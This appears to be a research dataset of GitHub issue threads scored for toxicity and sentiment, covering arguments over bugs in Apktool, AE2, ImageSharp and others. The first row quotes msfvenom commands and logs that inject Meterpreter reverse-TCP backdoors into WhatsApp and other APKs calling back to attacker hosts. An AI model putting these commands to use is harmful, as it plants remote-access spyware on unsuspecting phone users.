_id,perspective_score,owner,repo,title,length,num_one_letter_word,num_non_alpha_in_middle,senti4sd_neutral_percentage,total_url,total_text,num_modal_word,total_reference,num_punct,senti4sd_negative_percentage,senti4sd_positive_percentage,num_capital,num_QEMark,toxicity
iBotPeaches/Apktool/1707,0.109625625,iBotPeaches,Apktool,Error: Unable to rebuild apk with apktool,7376,35,283,0.6842105263157895,1,"I am using apktool v 2.3.1. on Kali Linux. I get this error. Yesterday I have tried and it worked, today I get this error with any APK, tried at least 10. "" Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.zumvr [] Loading /tmp/d20180110-6408-1ej4cd4/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6408-1ej4cd4/output.apk Error Unable to rebuild apk with apktool ""  Unfortunately apktool seems to be packaged into a 3rd party application here using apktool to pack some payload into an application. The reason for the build failure is not including in this stacktrace so nothing I can do here. Thanks for the report, but not enough details here for me to investigate.  What details do you need? I will provide because I really need to get this fixed  Generally every bit of details that the issue template requests. You removed it and just posted a stacktrace of a 3rd party tool that didn't even expose the stacktrace from Apktool. So generally useless for me. I would report this to whatever tool this is.  I am really sorry, I'm in a hurry. msfvenom -x Whatsappo.apk -p android/meterpreter/reverse_tcp LHOST=MY IPLPORT=6666 -o W.apk Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.megzx [] Loading /tmp/d20180110-6779-18jmnct/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6779-18jmnct/output.apk Error Unable to rebuild apk with apktool root@friend~/Desktop/MSF/Original APKS#  how to fix this error msfvenom -x /root/Desktop/Musixmatch.apk -p android/meterpreter/reverse_tcp LHOST=197.231.43.178 LPORT=6060 -o /root/Desktop/Musixmatchreload.apk Using APK template /root/Desktop/Musixmatch.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.musixmatch.android.lyrify.pnriw [] Loading /tmp/d20180528-4429-p0wqf6/original/smali/o/abm.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_FINE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SEND_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_COARSE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECEIVE_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding /root/Desktop/Musixmatch.apk with meterpreter injection as /tmp/d20180528-4429-p0wqf6/output.apk Error Unable to rebuild apk with apktool  really . is there no solution  Error Unable to rebuild apk with apktool  any one have a solution?  here you can solve the problem as i answered this question on stackoverflow Link To The Answer On Stack Over Flow  Error Unable to rebuild apk with apktool my apktool is already updated  I too have the same error root@friend~/Downloads# msfvenom -x myidea.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11560 -o /root/Desktop/myideafreerecharge.apk Using APK template myidea.apk [-] No platform was selected, choosing MsfModulePlatformAndroid from the payload [-] No arch selected, selecting arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.ideacellular.myidea.qwpse [] Loading /tmp/d20181112-9095-1hglxlh/original/smali/com/ideacellular/myidea/MyIdeaApplication.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [*] Rebuilding myidea.apk with meterpreter injection as /tmp/d20181112-9095-1hglxlh/output.apk Error Unable to rebuild apk with apktool my apktool is updated to latest version 2.3.4  i have updated the answer on StackOverflow Follow The mentioned link again.  already tried but not working  what didn't work ? did u injected manually and rebuilt your apk using ""android studio"" ?  i have updated my apktool by following ur steps  installed zipalign and tried my process as above  still getting the same error  as i said in ""In The End"" Part , if you still having the rebuilding problem , it's because of apktool that cannot rebuild large apk files, use lower size apk file (&lt;5MB) or use another tool for rebuilding your apk file and inject your Codes or files manually also.  another tools???  same problem when using 1.3 mb file ",5,63,753,0.10526315789473684,0.21052631578947367,593,7,
AppliedEnergistics/Applied-Energistics-2/3507,0.17057127,AppliedEnergistics,Applied-Energistics-2,EnderIO combined with AE2 and ThermalExpansion,1040,3,21,0.2,0,"  Description EnderIO does not replace all Flour-Items from AppliedEnergistics2. The Pulverizer from ThermalExpansion normally produces AppliedEnergistics2 Flour, but in combination with EnderIO it just produces AppliedEnergistics2 Disabled Item. All other grinders (like SAG-Mill, Grindstone, etc.) produce the EnderIO dustWheat. Environment Steps to reproduce  Install AppliedEnergistics2, ThermalExpansion and EnderIO Place a Pulverizer, power it and put Wheat in it. AppliedEnergistics2 Disabled Item is produced  EnderIO 1.12.2-5.0.21  EnderCore 1.12.2-0.5.18 Minecraft 1.12.2 Forge 14.23.3.2655 AppliedenErgistics2 rv5-stable-11 ThermalExpansion 1.12.2-5.4.2.25-universal   Oh never mind... Going to replace AE2 with Refined Storage and ask everyone with similar problems to do so as well... They at least respond to issue posts... And they don't have this and similar problems... Bye bye AE2  No need to become rude just because you are impatient. The devs are doing it for free and don't owe you shit so you are free to not use ae2 ",0,0,53,0,0.6,73,0,
AppliedEnergistics/Applied-Energistics-2/3800,0.107407905,AppliedEnergistics,Applied-Energistics-2,ConcurrentModificationException when loading into world,5301,23,210,0.5,1,"Whenever i load my world my fps stutters heavily and eventually the game freezes  When the game locks it never starts back up again, Using custom modpack i made in twitch client, in Singleplayer log  Version 1.12.2 AE2 Version rv6-stable-3 Forge Version 14.23.5.2770   Does this happen always? If so can you try and reduce the amount of mods to a mininum amount possible, or alternative remove just one or 2 until it no longer appears? On the first glance it looks like something tries to use multithreaded worldloading, which is just wrong and we are just the first mod affected by it and crash therefore.  Will do this evening  @friend what was your findings, having same problem in my quite random private SP pack  i couldnt find the mod causing it. No matter the combonation it seemed to happen at random and only in that world  Encountering this too. I have been trying for some days now on a reproduction method but cannot find the cause as of yet. ♠Time 1/7/19 323 AM Description Exception in server tick loop java.util.ConcurrentModificationException     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java634)     at net.minecraftforge.fml.common.FMLCommonHandler.onPostServerTick(FMLCommonHandler.java266)     at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java712)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java526)     at java.lang.Thread.run(Unknown Source) A detailed walkthrough of the error, its code path and all known details is as follows -- Head -- Thread Server thread Stacktrace     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677) -- Sponge PhaseTracker -- Details     Phase Stack [Empty stack] Stacktrace     at net.minecraft.server.MinecraftServer.handler$onCrashReport$zjk000(MinecraftServer.java3980)     at net.minecraft.server.MinecraftServer.func_71230_b(MinecraftServer.java889)     at net.minecraft.server.dedicated.DedicatedServer.func_71230_b(DedicatedServer.java371)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java558)     at java.lang.Thread.run(Unknown Source)  can you possibly test without sponge? other than that, this MAY be an power issue, try to add some dense enrgy cells to your network, it is possible that your system has too low capacity and stall during startup in an infinite loop ... and maybe sponge with some tick shenanigangs grinds it to a halt  OP wasn't using Sponge. Sponge has nothing to do with this error.  Was i referring to op?  I quoted your log and the advice was meant in general, how about being constructive and check for what i wrote?  Original poster. If you check his crash report, he's not using Sponge. It's just a bias towards Sponge and if someone is gonna to push bias in-front of me I'm going to slap you down. Stop it.  So in that case perhaps help us out a little. You did not post your whole log so we can not see what mods you have so we cannot look for mods you may have in common with the OP.  3812, #3831 Plenty of crash reports to build enough correlation. I don't understand the Sponge hate and it's completely unnecessary and off-topic. Suddenly people care about this because ""Sponge"". Really interesting.  Asking to try it without sponge is perfectly fine. It could easily be caused by some changes to chunkloading or similar system, which sponge likes to do and some other mod might simply include similar changes because they claimed it should be 5% faster but crashes in return. It would simply remove some variables and could make it easier. Or at least rule it out as possible cause. But it appears you are not actually interested in identifying a potential cause as well as reject a simple and quick request. So I do not see any chance to get something useful out of it from discussing it any further. ",12,1,307,0.08333333333333333,0.3333333333333333,266,5,
BEEmod/BEE2.4/937,0.07706064,BEEmod,BEE2.4,Prerelease 28 and 29 fail to build maps,3057,35,18,0.2,2,"This is a problem that many people have. It's a puzzle not building with prerelease 28 or 29. I never copied the output, but let's just say that it could even be blank and it will still fail. I'm trying right now to make a map that involves wall climbing. If you don't know what wall climbing is, you put a cube down to the corner of 2 walls, and put something ontop of it that's small, like a camera. I will try pre release 27 for this, and if it does have this issue, this needs to be fixed in prerelease 30 unless you can give me a fix.  When using BEE2.4 after installing a new version, old resources from past releases will not be overwritten, resulting in bugs that were fixed still being present and some things not working correctly. Your issue clearly seems te be related to this, so in order to solving this annoyance, you will have to do the following 1 - Open Beemod and click on . 2 - Wait 1 minute while Beemod removes their resources from Portal 2. 3 - Verify the Game Cache Files. 4 - Make sure to have downloaded and unzipped the latest Item's Packages and Application version of BEE2.4, and both must be from the same Pre-Release Version, otherwise bugs may occur. Links  (Application)   (Item's Packages) Note that if you are running Beemod on Linux or Mac Os X, or even on 32 Bit versions of Windows, issues can occur. Beemod currently works well only on 64 Bit versions of Windows 7, 8 and 10. 5 - Click on , then uncheck the option . 6 - Now choose your favorite Items &amp; Style and export your palette to the game. 7 - Make sure to save these steps in a text file in case you get similar issues in the future. 8 - Happy mapmaking!  Why close it? It’s possible that it won’t work.  This still didn't fix it, so who's the noob now? Give me the actual fix, you bitch.  Woah that came out of nowhere Icy. Calm yourself Lautaro's ways has worked for me and if its not working for you. You probably did something wrong. Or your items are placed in ways that break the map. Check the placement of items and their orientations. Make sure no items are behind/below partial blocks. etc.  it all checks out, I did all of the stuff he said, nothing works... But this error message came through. Get your ass ready though, it's quite long. compile errors.txt  That seems to be your issue but I dont know how to fix that. Ask Lautaro or someone  @friend Please no swearing there is no need for it.  Lol it is pretty fun for me to see when noobs gets mad so easily.  Uhmm... How about no? I am not the author of Beemod, the author is @friend, which is the one who works on the compiler thing. I am just a collaborator. PrayForNoobs  well I need a fix, I even had to have my friend fucking publish one of my levels for me, I don't want everything I make to be my friend's shit anymore.  @friend Please stop with the swearing there is no need for it.  In light of the Bee2 Contributing Guidelines, this issue is getting locked due to excessive fowl language and toxicity. Please do not repeat this behavior in future issues.  @friend Good thinking. ",9,1,109,0.4,0.2,91,4,
Contentify/Contentify/398,0.0653789675,Contentify,Contentify,[Bug] Errors everywhere. Nothing works at all.,4863,47,12,0,0,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell.  Ok I found the mistake. Ever heard of case sensitive? Apperently not  Hello Contentify is an open source software without any funding or commercial background (currently at least). Creating and maintaining an entire CMS usually keeps whole companies busy over years, costing up to millions of dollars / euros. Lacking these means you have to try to find smart cutoffs. This is why Contentify has zero tests (automatic tests via PHPUnit etc.) and this is why there is no huge testing phase before a new version of Contentify is released. Sometimes this causes error. You faced one of these, because Contentify is developed on Windows, not on Linux. Windows is case insensitive regarding file names.  Closing this one. Please stick to constructional criticism if you want to get help.  The fact that you say ""Developt on Windows"" shows me that you have no idea. Case Sensivity is something that everyone should follow, and I am sorry that you don't see that. Here your critic First apache_get_modules is a security issue and by default on most webservers disabled Second Your installer ignores the entry at the MySQL data and tries as root anyways, you have to reload the page and try again for it to work, I would guess thats because you first try to connect before reading and saving the mysql data. Third Case sensivity is something that exists since years, and it became a standard under developers to always keep case sensivity in mind. and last but not least If it was developt on windows and does not work on Linux by nature, you should write that in the requirements.  And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO  Oh also btw WoltLab and WordPress are also Open Source and they have way more features.  Another afront, and again you do not care about the reasons. Ofcourse every developer who creates software that typically runs on a Linux OS has to know about the important differences between the target OS and the development OS. Thus however does not guarantee no typos etc are made. Take a look at your own quote, you quoted me wrong (""Developt""). Nothing else happened @ Contentify. A stupid mistake, yes. But if you do not take the circumstances into account you should be very careful with attacking others. And again, you blame others for not creating a perfect software for free.  No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one  But whatever, I will fork it, exchange it and do a pull request. Is that enough Constructive critic for you?  Good. Whetever. I don't care. I am not a user of this, a friend asked me to setup it for him and I said yes and since 24 hours I just have problems. I fixed it now, you know about the Case Sensivity error, I don't care about anything else.  Thank you, for reporting the issues and giving explanations why they are issues. Believe it or not, I understand why you are upset. I work as a professional software developer and I’d be very upset if a software that I have bought does not work. But that is the point, this is not the case here. The only “payment” is... if some say “thank you”, I guess. Getting negative feedback is okay but it is frustrating as well if it feels like an attack against the persons that spend their free time on creating something without making any money with it.  Sorry for being a bit harsh. It was just that the tone of your second and third post was quite unfriendly. Honestly, Contentify cannot reach the same high quality level as for example WordPress. WP has a huge community and lots of contributors plus a strong commercial background. None of these is true for Contentify. Therefore, it has no ads ad all, nowhere at all (except of some recommendations which do not generate any money). It does not spy on you or restrict you. DSVGO / GDPR...  If this really is something that interests you, let me ensure you, the only thing you have to worry about is the use of Google Analytics on the contentify.org website. That's the only ""evil"" third party software that is in use. And on our side, we do collect very (extremely?) few client data and we do very (rarely / almost none) analysis of the collected data. And ofcourse we do not sell / share any user data (not including Google Analytics).  @friend Do not listen to him this CMS is great and thanks for creating!  Update Contentify.org is officially GDPR compliant. ",7,2,135,0,0,159,4,
Foliotek/Croppie/587,0.15567564,Foliotek,Croppie,Warning! Do not use this plugin,1540,24,15,0.25,1,"I've spent 3 DAYS configuring this plugin to work nicely in a Bootstrap modal and the final result looks UGLY. It turned out that the plugin has numerous issues. In other cases, I'd fill detailed bug reports, but now I feel so desperate... I don't see any sense in posting issues that will duplicate existing ones. If you're reading this while choosing a JS plugin for image cropping, DO NOT USE CROPPIE!!! Go look for any better alternatives. The most important issues that I encountered  when input image is of type JPG and I try to get result (of type PNG by default), it produces a blank image. when  and  and image is zoomed in, it's possible to drag viewport bounds outside of the container bounds. it results in hidden viewport bounds and an overzoomed image; it's impossible for user to fix this, user is forced to refresh the whole page. when  it's impossible to make aspect ratio fixed.  Expected Behavior it works. Actual Behavior it doesn't.  Browser Chrome 71 Plugin version 2.6.2   Sorry you experienced issues with croppie.  I'll be the first to admit that I don't have as much time as I'd like to support this anymore. That being said, plenty of people use croppie with the bootstrap modals  you don't want to use Croppie, that's fine.  I honestly don't care.  But to post an insulting issue in an open source project that I (and several other people) have spent a lot of time building, and have been gracious enough to share with the community  .... is rude. Next time try just asking for help before you lose your temper. ",4,0,56,0.25,0.25,60,3,
AnthonyMarc23/Doomsday-Trail/1,0.07908532,AnthonyMarc23,Doomsday-Trail,worked on css and mobile responsiveness,21,0,1,0,0,@friend check it out ,0,0,1,0,0,0,0,
k0shk0sh/FastHub/2181,0.028964482,k0shk0sh,FastHub,Strings: Improve Wording & Grammar,357,1,1,0,0,"Proposes several changes to increase ease of reading strings. The general message conveyed has not been changed, but there have been some adjustments  Typos fixed Punctuation added where currently missing Consistency in terms of American/British language (specifically the word ""organizations"") A couple of changes to words which sound better  (cc @friend) ",0,0,10,0,0,8,0,
roikles/Flexbones/61,0.055976979999999996,roikles,Flexbones,Taxonomy column in wp admin,262,3,3,0,0,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php  Fixed in 846dcdc ,1,0,3,0,0,3,0,
TechEmpower/FrameworkBenchmarks/1024,0.071699858,TechEmpower,FrameworkBenchmarks,Delete play-java/scala because they have been replaced by play2-java/scala,133,1,1,0,0,"I removed the dirs in #883, but the dirs were accidentally re-added in when merging PR #1015.  Ah, my bad. Thanks for cleaning it up ",0,0,7,0,0,5,0,
RoboCup-Humanoid-TC/GameController/17,0.0325882405,RoboCup-Humanoid-TC,GameController,Rhoban Football Club logo,74,0,0,0,0,Adding the Rhoban Football Club logo (HL KID team 16)  Looks good to me ) ,0,0,3,0,0,10,0,
SixLabors/ImageSharp/485,0.080479565,SixLabors,ImageSharp,İmage file size problem after image.save(...)  is this problem coming from OS or do we need to change something in the code..?,9971,83,98,0.34615384615384615,0,"Prerequisites  [ ] I have written a descriptive issue title [ ] I have verified that I am running the latest version of ImageSharp [ ] I have verified if the problem exist in both  and  mode [ ] I have searched open and closed issues to ensure it has not already been reported  Description   Steps to Reproduce   System Configuration    ImageSharp version Other ImageSharp packages and versions Environment (Operating system, version and so on) .NET Framework version Additional information   please direct questions to our gitter channel as it says in our readme  Thank you,  Scott, for the answer so quick.  I am very new to using this channel. Please accept my excuse.) So the question for me was .. when I save the image, the size of a saved image is not the correct size. I think this problem probably comes from my OS(Windows 10).  I wanted to know if is there another way to save the image in your library. Thank you very much.  This problem I have faced before. When I tried to save image as an object directly, no matter bitmap or image object in windows forms by c#, I had the problem.  The size of the saved image was always wrong. I do not remember but I think I have solved by using file stream class.. It may give a clue. I will try to find a way base on this experience.  Not sure If I can.  @friend can you be more specific? We hardly understand your issue.  When getting incorrect results Are you trying to resize + save your image with ? Or are you trying ImageSharp? (We do not depend on OS services at all btw.) If you are looking for basic ImageSharp resize examples, just go through our main README.  If your issue is ImageSharp specific, and you are getting results different from what you expect Can you please share a basic sample code snippet/console application reproducing your issue with your sample image attached?  The image uploaded is 4.30 MB .the Image saved by the code below is always as less than 1 MB.                 using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                          //with encoder it changes but still wrong                         //without encoder it allways wrong size for saved image                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                           image.Mutate(x =&gt;                         {                             x.AutoOrient();                             //x.Resize(image.Width / 2, image.Height / 2);                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                             x.Grayscale();                             image.Save(fileSaveGrayUrl, imageEncoder);                             x.BlackWhite();                             image.Save&lt;Rgba32&gt;(fileSaveBWUrl, imageEncoder);                             x.Lomograph(new SixLabors.Primitives.Rectangle(5, 5, 300, 400));                             image.Save&lt;Rgba32&gt;(fileSaveLMUrl, imageEncoder);                         });                       }                 }   So you mean file size. It wasn't clear from your original post, ""image size"" usually means image dimensions. By applying filters like blackwite or grayscale, you are loosing information, and jpeg is a compressed format, so it works as expected. Do you also get a 4x smaller file size after applying AutoOrient (without doing a resize)? Can you share a sample image reproducing the issue? Can you also explain why is this an issue in your application? Is the image quality insufficient?  on min, please I am installing visual studio preview.  Later on, I will send you both the source image and the output image.  You seem to keep describing what your seeing not what the problem is.. basically we need to know why a 1mb file is wrong. As far as I can see you are taking an image, resizing it so that it 4 times less the number of pixels and are confused about the fact you are getting an image out that's 4 times smaller, personally that's an outcome I would be hoping for.  I guess you need to deal with it. As I have mentioned before. When somehow an image is resized by c# in windows machine I mean visual studio and when we did a save this resized Image directly, Like img.Save(....) , this problems comes out. So it was a long time ago, as I remember, my solution was, to read and write with byte arrays using filestream objects. So my opinion, the problem is not coming from your code but you need to handle this problem. I will share with you the details.  We need to deal with nothing. Our operations work well. You STILL haven't described why 1mb is wrong.  Because I did not resize . ıt should be the same size  //x.Resize(image.Width / 2, image.Height / 2);  it is only comment  4.30 MB the source the destination is less than 1mb without resizing  All that means is you have likely used a better/higher compression ratio than the original source image. Unless the output actually looks wrong to a human eye then it's doing exactly the right thing.  the output looks exactly like the source. Only the source is 4.30 MB output is something like 800kb The properties of output are similar to the source but the size is different. In 10 min I can share proper code and related images . Give me time please I will be more clear.  Then well done you have successfully used imagesharp, and we have saved you alot of space. Your welcome. That's exactly the output imagesharp is trying to accomplish.      public IActionResult OnPost()     {         if (MyFiles.Count &gt; 0)         {             foreach (IFormFile fl in MyFiles)             {                 FileInfo flInfo = new FileInfo(fl.FileName);                 string getExt = flInfo.Extension.ToLower();                 string newFileName = RandomString(5) + getExt;                 string fileSaveUrl = Path.Combine(TempUploadFolderPath, newFileName);                  using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                         image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl);                         });                     }                 }              }              return null;         }         else         {             Message = ""File not selected"";         }         return null;     }   source image is 2.24 MB otput image is  474KB  If I use  IImageEncoder like                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                          image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                         });    Images please. Explain please why is this behavior wrong for you? It's a good thing to have smaller files.   source still the same 2.24MB the output image is 1.06MB     better but not similar. I can understand because it passes through jpeg compression but still the difference is big. Still, I think this is the windows issue.  Would be nice to handle. Thank you very much for your patience. I continue to follow you. Have fun  Consider I bought 1 kg apple in the market at home it becomes 300 gr .) or reverse it at home you produce 1Kg apple when you arrived at the market you have 250 gr to sell... It is ok not much important.  Only sounds a bit not natural. )  The difference is staring you in the face. You've clearly demonstrated what affects the output size. Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer within jpeg uses colors and sampling and can cause a massive drop in image size with very little difference in quality. Something you could have easily researched. It's all on Wikipedia for example. Now.... I need you to stop posting here. This is an issue tracker, for real issues not a forum for you to discuss your fantastical ideas. We have clear guidelines which you obviously ignored. If you continue to waste our time you will be blocked. Do you understand?  I did s simply a joke base on  your answer(--Explain please why is this behavior wrong for you? It's a good thing to have smaller files.)  But still the question is there (--Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer ....) In the code, I have an example which saves the image without defining the quality and in another example with defining the quality. The output is not similar but in both, the output is not the correct size. My purpose is trying to understand your library and use it. Because I have found it brilliant. Also, I have shared the issue  I have faced.  For the purpose to help for improving.  Sorry for the joke. The issue is still there...  @friend what we are trying to tell you is there is no issue... the library is working as designed you feed it an image (that may or may not have been previously saved in a optimised fashion) you then save it and we do all the optermisation on the image we can to reduce file size (thus we actually reduce the size significantly), unless there is actual issue with the visual output of the image then we have done our jobs very well and there is no issue/bug. As ee are getting no where repeating the fact that saving a file and reducing the size with out effecting the visual quality is a good thing i'm locking this thread. ",22,0,459,0.07692307692307693,0.5769230769230769,336,11,
SixLabors/ImageSharp/513,0.1618841725,SixLabors,ImageSharp,Compiling against net451 has multiple errors that are not there for netstandard2.0,3486,32,31,0.8,0,"Description When compiling against net451 I get multiple errors that are no present when compiling against netstandard2.0. Steps to Reproduce The following line will error when compiling against net451. System Configuration  ImageSharp version 1.0.0-beta0003 Other ImageSharp packages and versions n/a Environment (Operating system, version and so on) Windows 10 .NET Framework version All Additional information n/a   The .NETStandard 1.1 target utilized for NET451 is missing some file APIs that you are trying to use. Are you able to target .NET461?  Yeah, that’s not a bug. We also even show in the example code in the readme that the File API overload requires netstandard 1.3+  Can you explain why you can't target net451? Usually any code that compiles for netstandard2.0 will also compile against net451!  .NET 4.5.1 was released in 2013 and is no longer supported by Microsoft.  Is there a reason you are unable to target a higher framework version?  @friend just take a stream using  and pass it to . @friend on one hand, I really really want to get rid of NET Standard 1.1, but on the other hand there are so many large enterprises having stupid IT limitations keeping them in the stone age. I really wish we knew how many users do we have amongst such companies. @friend is this your case? 😄  @friend - The reason a lot of projects target net451 as well as netstandard2.0 is that although you need net461 for netstandard2.0 the API surface for net451 is almost identical to netstandard2.0 and in most cases you will be able to target net451 without any code changes. @friend - For me the two required targets would be net451 and netstandard2.0. The net451 target would allow us to keep supporting customers on Windows Server 2008 with extended maintenance. The netstandard2.0 target would be for for new development. @friend - My personal opinion is that .NET Standard versions earlier than 2.0 are at best confusing. Based on the above grid, my suggestion would be to target netstandard2.0, netstandard1.2 and net451. This would not only give multiple targets but the available methods would be based on capability and not the arbitrary .NET Standard versions.  @friend You do understand with an explicit  target you're asking us to target a brand new library against an obsolete framework with no security updates available?  @friend - Targeting net451 will allow better support for .NET 4.5.1, .NET 4.6, Mono 4.6 to 5.2. If you can target net451 I don't see the problem in doing so as the framework choice is down to the package consumers who might have a valid reason for requiring net451 (e.g. Windows Server 2008).  @friend All of those frameworks are supported by Net Standard 1.1 I think you are failing to understand exactly what a standard is. I suggest you look again at the picture I posted above. You might not see a problem but I most definitely do. Targeting .NET 4.5.1  Adds complexity to the build Can severely limit future development Means that I am now referencing unsupported binaries that may well contain security issues.  And for what? So you can avoid using a FileStream in your consuming code and support an operating system that has another 1 1/2 years of support? There's a sense of entitlement here I am detecting that I find deeply unpleasant. You are asking me to do what a soon to be trillion dollar company will not and cannot do. I'm going to lock this issue now and I suggest you have a good think about your attitude towards open source. ",19,2,103,0,0,117,8,
mezz/JustEnoughItems/1153,0.281483245,mezz,JustEnoughItems,[Enhancement] KeyBind to Hide All JEI,2032,30,14,0.4642857142857143,0,"Not 100% sure but, after looking for 6 minuets in keybinds and options in jei I can't find a hide jei all option only the left panel. The point of this would be your tired of it for a bit and want to remove it or you don't want others to think your cheating in survival. Default keybind""o"" Also keep the boolean public so modders can decide where and when to hide it  JEI doesn't have a left panel. The item list can be hidden with CTRL + O  Ever heard of encapsulation)?  um key bind to hid the right panel control + o hides the left panel when addons are in  Then you should request those addons add their own keybind. They have absolutely nothing to do with JEI.  No because the other addons can't hide jei jei needs to get hidden with a keybind or under specified conditions via boolean visible not the addon pannel  JEI does not draw on the left side of the screen. JEI's keybind for hiding itself (the right side ingredient list) is Control+O by default, and configurable in the controls menu. If it is not working, or the behavior is changed, it's because some other mod is messing it up. Please find out which and report to them.  Did You read I said right side  I am close to 